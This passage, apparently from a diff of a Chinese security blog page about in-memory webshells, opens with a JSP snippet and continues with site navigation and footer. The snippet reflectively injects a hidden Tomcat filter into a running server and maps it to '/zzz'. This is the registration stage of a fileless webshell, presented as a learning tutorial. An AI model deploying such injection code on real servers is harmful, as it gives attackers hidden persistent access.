stdctx.get(applicationContext);</span><br><span class="line">Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">String name = <span class="string">&quot;filterDemo&quot;</span>;</span><br><span class="line"><span class="comment">//判断是否存在filterDemo1这个filter，如果没有则准备创建</span></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//定义一些基础属性、类名、filter名等</span></span><br><span class="line">filterDemo filter = <span class="keyword">new</span> filterDemo();</span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//添加filterDef</span></span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/zzz ,也可以所有页面都可触发可设置为/*</span></span><br><span class="line">FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line"><span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/zzz&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//添加我们的filterMap到所有filter最前面</span></span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class="line">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//将filter名和配置好的filterConifg传入</span></span><br><span class="line">filterConfigs.put(name,filterConfig);</span><br><span class="line">out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">out.write(<span class="string">&quot;Injected!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/wan1/2022/12/20/JAVA%E5%9F%BA%E7%A1%80-1/" rel="prev" title="JAVA基础-1">
+      <i class="fa fa-chevron-left"></i> JAVA基础-1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/wan1/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/" rel="next" title="DNS隧道基础">
+      DNS隧道基础 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.</span> <span class="nav-text">初探内存马</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.</span> <span class="nav-text">各种内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.1.</span> <span class="nav-text">php内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.2.</span> <span class="nav-text">python内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">2.3.</span> <span class="nav-text">java内存马</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="十三"
+      src="/wan1/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">十三</p>
+  <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/wan1/archives/">
+        
+          <span class="site-state-item-count">172</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">十三</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/wan1/lib/anime.min.js"></script>
+  <script src="/wan1/lib/velocity/velocity.min.js"></script>
+  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/wan1/js/utils.js"></script>
+
+<script src="/wan1/js/motion.js"></script>
+
+
+<script src="/wan1/js/schemes/pisces.js"></script>
+
+
+<script src="/wan1/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/wan1/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
